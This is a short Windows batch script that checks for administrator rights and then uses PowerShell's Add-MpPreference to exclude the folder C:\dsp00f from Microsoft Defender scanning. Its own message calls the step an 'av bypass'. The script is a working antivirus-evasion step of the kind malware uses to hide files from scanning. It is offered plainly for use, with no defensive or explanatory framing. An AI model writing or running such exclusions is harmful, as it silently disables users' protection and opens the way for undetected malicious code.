@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo uac needed
    pause
    exit /b 1
)
set "fldr=C:\dsp00f"
PowerShell -Command "Add-MpPreference -ExclusionPath '%fldr%'"
if %errorLevel% equ 0 (
) else (
    echo av bypass fail
    pause
)